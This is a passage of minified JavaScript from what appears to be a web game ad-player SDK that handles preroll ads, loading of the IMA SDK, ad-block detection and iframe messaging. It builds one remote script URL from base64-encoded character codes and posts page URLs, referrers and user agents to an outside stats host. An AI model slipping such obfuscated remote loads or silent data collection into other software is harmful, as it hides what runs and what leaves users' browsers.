                !0 === f.autoplay && 0 < a.R.size.preroll ? a.fetchAd.apply(a, w$(a.options.$c)) : !0 === n && 0 < a.R.size.preroll ? a.fetchAd.apply(a, w$(a.options.$c)) : a.Kd = 0 < a.R.size.preroll ? !0 : !1;
                !0 === a.ed && (a.Ld(), a.ze());
                !0 === a.isFlashGame && !0 !== a.jb && (a.Mc(!0), !0 === a.options.fe ? (a.xd(), a.Fa(!0)) : a.sk());
                a.bi(a.G().getBoundingClientRect().width, a.G().getBoundingClientRect().height);
                a.ea.AdContainerInit = {
                    V: "6.0.26.12",
                    AC: a.u().getBoundingClientRect(),
                    CC: a.G().getBoundingClientRect()
                };
                window.addEventListener("resize", function() {
                    a.Vd();
                    a.wd() && a.s("[data-wgplayer].wgInited{\n                        width:" + a.ka.w + "px !important;\n                        height:" + a.ka.h + "px !important;\n                    }")
                }, !1);
                window.addEventListener("beforeunload", a.th, !0);
                a.Ca() && setTimeout(function() {
                    2 <= a.Sg ? a.j(167) : (window.removeEventListener("message", a.Ke, !1), a.destroy(), a.fh(), a.uj(), w$k(window.preroll.config, !0))
                }, 2E3);
                "function" === typeof window[f.postInitAfgCallback] && window[f.postInitAfgCallback].call(this, a);
                a.ea.id = a.ia.id;
                a.ea.mobileDetect = {
                    device: a.eb.ib,
                    ua: a.eb.userAgent
                };
                !0 === a.options.forceAutoplay && (a.j(168), a.Mc(), a.xh());
                window.onappinstalled = function() {
                    a.j(169);
                    a.em({
                        a: "PWA",
                        b: (a.Oj() ? "Tablet" : a.Mj() ? "Phone" : "Desktop") + " install",
                        c: window.location.href
                    })
                };
                try {
                    var d = location.pathname;
                    "/" === d.charAt(d.length - 1) && (d = d.substr(0, d.length -
                        1))
                } catch (e) {}!0 === f.isSpa && a.Hj();
                a.Ca() && !0 === a.options.showmidrollOnIframeAtStart && a.refetchAd();
                null !== a.options.moreGames && "undefined" !== typeof a.options.moreGames && !a.Aa("moreGamesWasDisplayed") && (a.options.moreGames.feed || "undefined" !== typeof a.options.otherGames && a.options.otherGames.file) && a.Ag.init();
                if ("undefined" !== typeof a.options.promoGames && a.qg && a.Ca() && !a.isMobile()) {
                    if (!1 === a.options.promoGames.Tk) return !1;
                    a.promoGames.init(a.options.promoGames.feedURL);
                    "true" === a.te("promoGamesRecall") && a.promoGames.vg()
                }!1 === a.hd && !1 === a.rh && a.Ca() && (a.sj(), a.rh = !0);
                "string" === typeof a.options.triggerPre && (b = document.querySelectorAll(a.options.triggerPre)[0], "object" === typeof b && b.addEventListener(a.na, a.fetchAd));
                "string" === typeof a.options.triggerMid && (b = document.querySelectorAll(a.options.triggerMid)[0], "object" === typeof b && b.addEventListener(a.na, a.refetchAd));
                a.npa = f.npa && !0 === f.npa ? !0 : !1;
                a.j(170);
                w$j();
                document.addEventListener("wgIntClose", function(e) {
                    googletag.pubads().clear([e.detail]);
                    history.replaceState([], document.title, window.location.pathname + window.location.search);
                    a.Sb()
                });
                document.addEventListener("wgIntOpen", function() {
                    history.replaceState([], document.title, window.location.pathname + window.location.search)
                });
                document.addEventListener("wgIntReady", function(e) {
                    if (0 !== e.detail.type) return !1;
                    e = document.createElement("a");
                    e.appendChild(document.createTextNode(""));
                    e.title = "";
                    e.href = "?wgp=898967";
                    e.className = "wgPrerollIntCTA";
                    a.ja.querySelectorAll(".wgPrerollCTA")[0].insertBefore(e, a.ja.querySelectorAll(".wgPrerollCTA")[0].firstChild);
                    a.ja.querySelectorAll(".wgThumb")[0].insertBefore(e.cloneNode(!0), a.ja.querySelectorAll(".wgThumb")[0].firstChild)
                });
                a.options.prefetchPreroll && (!a.isFlashGame || a.isFlashGame && !0 === a.options.fe) && !0 === a.ed && (new Promise(function(e) {
                    var g = setInterval(function() {
                        0 <= a.u().getBoundingClientRect().left && 0 < a.u().getBoundingClientRect().right && (clearInterval(g), e())
                    }, 500)
                })).then(function() {
                    a.Xj()
                });
                console.log("WGP: V:U7.1.0.13.3")
            },
            updateConsent: function(b) {
                a.npa = b
            },
            th: function() {
                a.ea.time.abort = (Date.now() - a.ea.time.init) / 1E3;
                "function" === typeof window[a.options.debugCallback] && window[a.options.debugCallback].call(this, a.ea)
            },
            uj: function() {
                window.removeEventListener("message", a.Ke, !1);
                window.removeEventListener("resize", a.Vd, !1);
                window.removeEventListener("beforeunload", a.th, !1)
            },
            Ij: Math.ceil((new Date).getTime() / 1E3),
            Nl: -1,
            Rd: null,
            init: function() {
                document.addEventListener("keydown", function(b) {
                    b = window.event ? window.event : b;
                    b.ctrlKey && b.altKey && "KeyL" === b.code && (a.kd = !a.kd, !0 === a.kd ? a.j(171, "U7.1.0.13.3") : console.info("Logging stopped (U7.1.0.13.3)"))
                });
                a.options.app && !0 === a.options.app.addToHome && a.Va.init();
                !1 !== a.options.autoInit && a.nj()
            },
            Uk: null,
            ed: !1,
            nj: function() {
                if (!1 === a.options.preloadIma) return a.bc(), !1;
                if (a.isMobile() && !a.Ca()) a.bc();
                else {
                    try {
                        var b = "undefined" !== typeof google.ima
                    } catch (c) {
                        b = !1
                    }
                    if (!1 === b) {
                        b = document.createElement("script");
                        b.type = "text/javascript";
                        b.addEventListener("load", function() {
                            "undefined" === typeof google ? (a.Za = !0, a.ea.adBlock = !0, a.zb = new a.adBlock, a.zb.init()) : (a.ed = !0, a.bc())
                        });
                        b.addEventListener("error", function() {
                            a.Za = !0;
                            a.ea.adBlock = !0;
                            a.zb = new a.adBlock;
                            a.zb.init()
                        });
                        try {
                            b.src = "//imasdk.googleapis.com/js/sdkloader/ima3.js", document.getElementsByTagName("head")[0].appendChild(b)
                        } catch (c) {
                            console.log("Adblock present")
                        }
                    } else a.ed = !0, a.bc()
                }
            },
            hh: function() {
                return new Promise(function(b) {
                    var c = document.createElement("script");
                    c.type = "text/javascript";
                    c.addEventListener("load", function() {
                        "undefined" === typeof google ? (a.Za = !0, a.ea.adBlock = !0, a.zb = new a.adBlock, a.zb.init()) : b()
                    });
                    c.addEventListener("error", function() {
                        a.Za = !0;
                        a.ea.adBlock = !0;
                        a.zb = new a.adBlock;
                        a.zb.init()
                    });
                    try {
                        c.src = "//imasdk.googleapis.com/js/sdkloader/ima3.js", document.getElementsByTagName("head")[0].appendChild(c)
                    } catch (d) {
                        console.log("Adblock present")
                    }
                })
            },
            Xl: function() {
                return !0
            },
            Mj: function() {
                return "phone" === a.eb.ib
            },
            Oj: function() {
                return "tablet" === a.eb.ib
            },
            Rl: function() {
                return /Macintosh/i.test(navigator.userAgent) ? !0 : !1
            },
            Lh: function() {
                return /iPhone|iPad|iPod/i.test(navigator.userAgent) ? !0 : !1
            },
            De: function() {
                return /iPhone|iPod/i.test(navigator.userAgent) ? !0 : !1
            },
            Pl: function() {
                return /OS 7_/i.test(navigator.userAgent) ? !0 : !1
            },
            Ql: function() {
                return /OS 9_/i.test(navigator.userAgent) ? !0 : !1
            },
            Ae: function() {
                return !/Chrome/i.test(navigator.userAgent) || a.Fe() || a.Be() ? !1 : !0
            },
            Ol: function(b) {
                var c = !1;
                b.forEach(function() {
                    /e/.test(navigator.userAgent) && (c = !0)
                });
                return c
            },
            Fe: function() {
                return /OPR\//i.test(navigator.userAgent) ? !0 : !1
            },
            Be: function() {
                return /Firefox\//i.test(navigator.userAgent) ? !0 : !1
            },
            Lj: function() {
                return /\sEdge\//i.test(navigator.userAgent) ? !0 : !1
            },
            Nj: function() {
                return /puffin/i.test(navigator.userAgent) ? !0 : !1
            },
            Tl: function() {
                return navigator.plugins.namedItem("Shockwave Flash") ? !0 : !1
            },
            Wk: -1,
            Ca: function() {
                try {
                    return window.self !== window.top
                } catch (b) {
                    return !0
                }
            },
            Ak: function(b) {
                for (var c = b.length - 1; 0 < c; c--) {
                    var d = Math.floor(Math.random() * (c + 1)),
                        e = w$b([b[d], b[c]]);
                    b[c] = e.next().value;
                    b[d] = e.next().value
                }
                return b
            },
            sm: function(b) {
                return b.charAt(0).toUpperCase() + b.slice(1)
            },
            Ke: function(b) {
                b.data && "function" === typeof b.data.indexOf && -1 < b.data.indexOf("ima://") && (JSON.parse(b.data.replace("ima://", "")), a.Fj());
                if (b.data && "function" === typeof b.data.indexOf && -1 < b.data.indexOf("wgafg://")) {
                    a.j(172, b.data);
                    !0 === a.kd && console.log("WGP raw message", b.data);
                    var c = b.data.split("wgafg://");
                    if (0 < c.length && (c = JSON.parse(c[1]), c.action && (a.j(173, c.action), "initHandshake" === c.action && (a.j(174), a.hd = !0, b && b.source && (a.vc ? b.source.postMessage('wgafg://{"action":"navigate", "data":' + JSON.stringify(a.vc) + "}") : b.source.postMessage('wgafg://{"action":"receiveHandshake"}')), a.vc = null, !0 === a.sg && (a.j(175), a.sg = !1, b.source.postMessage('wgafg://{"action":"showRecallButton"}'))), "receiveHandshake" === c.action && (a.j(176), a.hd = !0, a.vc && b.source.postMessage('wgafg://{"action":"navigate", "data":' + JSON.stringify(a.vc) + "}"), a.vc = null), "navigate" === c.action && (a.j(177), b.source.postMessage('wgafg://{"action":"reminder", "data":"showRecallButton"}'), window.location.href = c.data.url), "reminder" === c.action && (a.j(178), "showRecallButton" === c.data && (a.j(179), a.sg = !0)), "showRecallButton" === c.action && (a.j(180), a.promoGames.vg(), a.j(181, a.hd)), "fetchAd" === c.action))) return c.data ? (a.j(182), a.vc = c.data, a.updateSplash("preroll", c.data)) : a.j(183), a.Ee = !0, a.La = !1, a.hd = !1, a.fetchAd.apply(a, w$(a.options.$c)), !1
                }
            },
            sj: function() {
                a.j(184);
                try {
                    window.top.postMessage('wgafg://{"action":"initHandshake"}', window.parent.location.href)
                } catch (b) {}
            },
            Ee: !1,
            sg: !1,
            vc: null,
            hd: !1,
            rh: !1,
            F: function(b, c, d, e, g) {
                c = void 0 === c ? null : c;
                d = void 0 === d ? null : d;
                e = void 0 === e ? null : e;
                g = void 0 === g ? !1 : g;
                var p = g ? document.createElementNS(g, b) : document.createElement(b);
                c && p.setAttribute("class", "wg" + c.trim());
                d && p.setAttribute("id", "wg" + d);
                e && e.forEach(function(m) {
                    p.setAttribute(m.name, m.value)
                });
                return p
            },
            Hl: function() {
                return "wg"
            },
            Jj: function(b, c) {
                b.parentNode.appendChild(c)
            },
            El: function() {
                return this
            },
            Gk: function(b) {
                var c = "";
                b = b[0].split(",");
                for (var d = 0; d < b.length; d++) c += String.fromCharCode(b[d]);
                return c
            },
            Zg: -1,
            Ml: function() {
                "undefined" !== typeof google ? window[window.preroll.config.loaderObjectName].bc() : a.Zg = setInterval(function() {
                    "undefined" !== typeof google && (clearInterval(a.Zg), window[window.preroll.config.loaderObjectName].bc())
                }, 100)
            },
            push: function(b) {
                console.log("Pushing into WG", b)
            }
        };
    a.j(185);
    (new Promise(function(b, c) {
        var d = setInterval(function() {
            if (f && ("none" === f.launchEvent || (f.contentContainer || f.contentContainerQuery) && (f.contentContainer && document.getElementById(f.contentContainer) || f.contentContainer && document.getElementsByClassName(f.contentContainer) && 0 < document.getElementsByClassName(f.contentContainer).length || f.contentContainer && document.querySelectorAll(f.contentContainer) && 0 < document.querySelectorAll(f.contentContainer).length || f.contentContainerQuery && document.querySelectorAll(f.contentContainerQuery) && 0 < document.querySelectorAll(f.contentContainerQuery).length))) {
                clearInterval(d);
                if (window.hasOwnProperty(window.preroll.config.loaderObjectName) && a.contentContainer && 0 < a.contentContainer.getBoundingClientRect().width) return a.j(186), !1;
                "function" === typeof window[f.preInitCallback] && window[f.preInitCallback].call();
                window.removeEventListener("message", a.Ke, !1);
                window.addEventListener("message", a.Ke, !1);
                delete window.preroll.config.loaderObjectName;
                if (a.Ga() || !0 === f.log) {
                    var e = document.createElement("SCRIPT");
                    e.setAttribute("crossorigin", "");
                    e.src = a.Gk([atob("MTA0LDExNiwxMTYsMTEyLDExNSw1OCw0Nyw0NywxMDAsMTAxLDExOCw0NiwxMTksMTAzLDExMiwxMDgsOTcsMTIxLDEwMSwxMTQsNDYsOTksMTExLDEwOSw0Nyw5NywxMDIsMTAzLDQ3LDExOCw1NCw0NywxMDgsMTExLDEwMywxMTUsNDYsMTA2LDExNQ==")]);
                    document.head.appendChild(e);
                    a.kd = !0
                }
                a.options = f ? f : window.preroll.config;
                a.Rd = a.nh(10);
                a.j(187, a.Rd);
                a.init();
                window[window.preroll.config.loaderObjectName] = a;
                window.WGPlayerAFG = w$k;
                a.Ca() ? a.j(188) : a.j(189);
                b()
            }
            10 < Math.ceil((new Date).getTime() / 1E3) - a.Ij && (a.j(190), clearInterval(d), c());
            a.j(191)
        }, 10)
    })).then(function() {}).catch(function() {});
    return a
}
(function() {
    var f = 0,
        k = setInterval(function() {
            if (window.preroll && !0 === window.preroll.config.isSpa && "undefined" !== typeof window[window.preroll.config.loaderObjectName]) return clearInterval(k), !0 === window.preroll.config.autoplay && window[window.preroll.config.loaderObjectName].fetchAd(null, !0), console.log("WGPlayer already present"), !1;
            try {
                "none" !== window.preroll.config.launchEvent ? (w$k(window.preroll.config), clearInterval(k)) : "undefined" !== typeof w$k && (window.WGPlayerAFG = w$k, clearInterval(k))
            } catch (t) {
                if (f++, console.log("Can not init", t, window.location.href), 10 < f) {
                    clearInterval(k);
                    var n;
                    setTimeout(function() {
                        if ("object" !== typeof preroll) {
                            try {
                                n = !1, n = window.self !== window.top
                            } catch (c) {
                                n = !0
                            }
                            var u = n;
                            var v = /.*st\.wgplayer\.com\/(.*)\/js.*/i,
                                h = document.getElementsByTagName("script");
                            if (h && 0 < h.length)
                                for (var l in h)
                                    if (l = parseInt(l, 10), h && h[l] && h[l].src && (-1 < h[l].src.indexOf("wgAds.js") || -1 < h[l].src.indexOf("/afg/v6/"))) var q = h[l].src;
                            try {
                                var a = q.match(v);
                                var b = a[1]
                            } catch (c) {
                                b = document.domain
                            }
                            u = {
                                Dj: u,
                                domain: b,
                                url: !0 === n ? document.referrer : window.location.href,
                                be: navigator.userAgent,
                                gm: Math.max(document.body.scrollWidth, document.documentElement.scrollWidth, document.body.offsetWidth, document.documentElement.offsetWidth, document.documentElement.clientWidth) + "x" + Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, document.body.offsetHeight, document.documentElement.offsetHeight, document.documentElement.clientHeight),
                                ul: "object" === typeof wgErrorCollector ? wgErrorCollector : ""
                            };
                            b = new XMLHttpRequest;
                            b.open("POST", "//w.wgplayer.xyz/stats/wgpiniterrors", !0);
                            b.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                            b.send(JSON.stringify(u))
                        }
                    }, 1E3)
                }
            }
        }.bind(this), 100)
})();